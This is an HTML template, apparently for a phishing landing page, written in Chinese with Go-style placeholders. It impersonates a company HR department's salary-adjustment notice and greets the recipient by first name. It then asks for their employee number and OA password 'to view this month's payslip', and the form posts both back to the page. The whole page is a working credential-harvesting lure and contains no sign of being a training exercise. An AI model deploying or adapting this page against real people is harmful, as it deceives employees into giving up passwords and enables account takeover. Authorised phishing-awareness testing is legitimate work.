<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>调薪确认</title>
  <style>
    body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', sans-serif; background: #fffbeb; color: #1f2937; }
    header { background: #b45309; color: #fff; padding: 18px 20px; }
    header h1 { margin: 0; font-size: 18px; font-weight: 600; }
    header p { margin: 6px 0 0; font-size: 13px; opacity: .92; }
    main { max-width: 420px; margin: 24px auto; padding: 0 16px 32px; }
    .card { background: #fff; border-radius: 8px; padding: 22px 20px; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
    .notice { background: #fffbeb; border-left: 3px solid #d97706; padding: 10px 12px; font-size: 13px; color: #475569; margin: 0 0 8px; }
    label { display: block; margin: 14px 0 6px; font-size: 13px; }
    input { width: 100%; box-sizing: border-box; padding: 10px 12px; border: 1px solid #d9d9d9; border-radius: 4px; font-size: 14px; }
    button { margin-top: 18px; width: 100%; padding: 12px; background: #b45309; color: #fff; border: 0; border-radius: 4px; font-size: 15px; cursor: pointer; }
    footer { margin-top: 14px; font-size: 12px; color: #94a3b8; text-align: center; }
  </style>
</head>
<body>
  <header>
    <h1>人力资源部</h1>
    <p>调薪结果与工资条</p>
  </header>
  <main>
    <div class="card">
      <p>{{if .FirstName}}{{.FirstName}}{{else}}同事{{end}}，请登录后核对本月工资条。</p>
      <div class="notice">工资条包含岗位工资、绩效和代扣个税。请使用本人 OA 密码查看。</div>
      <form method="POST">
        <label for="username">工号</label>
        <input id="username" name="username" type="text" autocomplete="username" required>
        <label for="password">OA 密码</label>
        <input id="password" name="password" type="password" autocomplete="current-password" required>
        <button type="submit">登录并查看工资条</button>
      </form>
    </div>
    <footer>人力资源部 · 薪酬福利</footer>
  </main>
</body>
</html>
